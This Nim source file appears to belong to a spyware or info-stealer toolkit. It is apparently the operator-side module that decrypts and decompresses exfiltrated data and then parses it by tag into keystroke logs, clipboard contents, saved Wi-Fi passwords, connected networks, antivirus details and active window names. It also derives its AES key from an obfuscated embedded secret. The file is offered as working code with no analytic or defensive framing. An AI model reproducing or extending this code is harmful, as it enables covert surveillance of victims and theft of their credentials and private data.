import aes
import hideString
import ../more/zlibstatic/src/zlibstatic/zlib
from ../flags import AES_ENCRYPT_KEY

from base64 import decode

from std/sha1 import secureHash
from std/sha1 import `$`

from strutils import split

import ../components/headerCard
import ../components/windowName
import ../components/clipboard
import ../components/keylog
import ../components/keyboardLocale
import ../components/av
import ../components/connectedWifi
import ../components/wifiPassword

proc parseThreads*(id: string, data: string): string =
  for thread in data.split("."):
    if thread == "":
      continue
    let threadSplit: seq[string] = thread.split(",")
    let threadName: string = threadSplit[0]
    let threadData: string = threadSplit[1]

    echo threadName
    case threadName
    of "h":
      result = headerCard.render(id, threadData.split(";"))
    of "wn":
      result.add windowName.render threadData.split(";")
    of "k":
      result.add keylog.render(threadData.split(";"))
    of "kl":
      result.add keyboardLocale.render(threadData.split(";"))
    of "c":
      result.add clipboard.render threadData.split(";")
    of "av":
      result.add av.render threadData.split(";")
    of "wp":
      result.add wifiPassword.render threadData.split(";")
    of "cw":
      for data in threadData.split(";"):
        if data == "":
          continue

        result.add connectedWifi.render data

proc decryptData*(data: string): string =
  result = uncompress(decrypt data, stream = RAW_DEFLATE)

proc initHeaderKey*(headerContent: string): void =
  config.key = $secureHash headerContent & d(AES_ENCRYPT_KEY) & config.aad & config.iv

proc clearHeaderKey*(): void =
  config.key = d AES_ENCRYPT_KEY
